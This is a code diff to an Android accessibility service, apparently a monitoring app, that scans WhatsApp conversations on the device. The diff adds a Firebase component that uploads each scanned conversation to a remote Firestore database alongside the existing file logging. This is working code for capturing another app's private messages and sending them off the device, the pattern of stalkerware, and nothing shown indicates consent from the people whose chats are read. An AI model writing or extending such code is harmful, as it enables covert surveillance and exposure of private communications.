@@ -10,6 +10,7 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import com.sentinel.config.ServiceConfig;
 import com.sentinel.utils.LoggingManager;
 import com.sentinel.utils.ScreenReader;
+import com.sentinel.service.FirebaseService;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -28,6 +29,7 @@ public class WhatsAppMonitoringService extends AccessibilityService {
     
     private LoggingManager loggingManager;
     private ServiceConfig serviceConfig;
+    private FirebaseService firebaseService;
     private volatile boolean componentsInitialized = false;
     
     
@@ -90,6 +92,10 @@ public class WhatsAppMonitoringService extends AccessibilityService {
             Log.d(TAG, "Initializing LoggingManager...");
             loggingManager = new LoggingManager(this);
             Log.d(TAG, "LoggingManager initialized");
+            
+            Log.d(TAG, "Initializing FirebaseService...");
+            firebaseService = new FirebaseService(this);
+            Log.d(TAG, "FirebaseService initialized");
             
             componentsInitialized = true;
             Log.d(TAG, "Essential components initialized successfully");
@@ -256,6 +262,14 @@ public class WhatsAppMonitoringService extends AccessibilityService {
                 // Log to file if logging manager is available
                 if (loggingManager != null) {
                     loggingManager.logInfo("CONVERSATION_SCAN", result.toString());
+                }
+                
+                // Store in Firebase if Firebase service is available
+                if (firebaseService != null && firebaseService.isReady()) {
+                    firebaseService.storeConversation(result);
+                    Log.d(TAG, "Conversation data sent to Firebase Firestore");
+                } else {
+                    Log.w(TAG, "Firebase service not ready, conversation data not stored in Firestore");
                 }
                 
             } finally {
@@ -453,6 +467,9 @@ public class WhatsAppMonitoringService extends AccessibilityService {
     private void cleanup() {
         if (loggingManager != null) {
             loggingManager.cleanup();
+        }
+        if (firebaseService != null) {
+            firebaseService.cleanup();
         }
     }
 }
